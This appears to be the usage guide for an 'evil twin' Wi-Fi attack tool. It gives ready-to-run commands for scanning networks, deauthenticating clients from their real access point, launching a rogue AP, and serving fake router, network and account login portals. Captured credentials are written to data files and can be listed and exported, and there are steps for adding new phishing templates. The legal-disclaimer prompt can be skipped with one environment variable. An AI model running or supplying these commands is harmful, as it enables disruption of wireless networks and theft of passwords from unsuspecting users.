# Usage

> Run every command with `sudo`. Set `WET_ACK_AUTH=1` to acknowledge the legal
> disclaimer non-interactively (e.g. in CI / scripts).

## Common flags

`--dry-run`  Print the exact commands/iptables rules without executing.
`--config F` Load a JSON config file (see `config/example.json`).

## Scan for targets

```bash
sudo python -m wifi_evil_twin scan --iface wlan0 --duration 15
```

## Deauthenticate a client from its real AP

```bash
sudo python -m wifi_evil_twin deauth --iface wlan1 \
    --bssid 00:11:22:33:44:55 --client AA:BB:CC:DD:EE:FF
```

## Start only the rogue AP

```bash
sudo python -m wifi_evil_twin ap --ssid Free-WiFi --channel 6 --interface wlan0
```

## Start only the captive portal (AP already running)

```bash
sudo python -m wifi_evil_twin portal --interface wlan0 --scenario router
```

## Full Evil Twin run (recommended)

```bash
sudo WET_ACK_AUTH=1 python -m wifi_evil_twin run \
    --ssid "Free-Public-WiFi" \
    --interface wlan0 \
    --monitor-interface wlan1 \
    --channel 6 \
    --scenario router \
    --deauth --deauth-bssid 00:11:22:33:44:55
```

This will: set up NAT/iptables, assign the AP IP, launch `hostapd`, launch
`dnsmasq`, start the Flask captive portal, and (with `--deauth`) continuously
deauth the target so clients roam onto the rogue twin. Captured credentials
land in `data/captures.json` and `data/captures.csv`.

## Inspecting captures

```bash
sudo python -m wifi_evil_twin creds                 # list
sudo python -m wifi_evil_twin creds --export out.csv
sudo python -m wifi_evil_twin creds --clear
```

## Scenarios

`router`  — fake router admin login (username/password)
`generic` — fake network login (email/password)
`social`  — fake account re-auth (account/password)

Add your own by copying a template in `wifi_evil_twin/templates/` and
registering it in `SCENARIOS` in `wifi_evil_twin/core/captive_portal.py`.
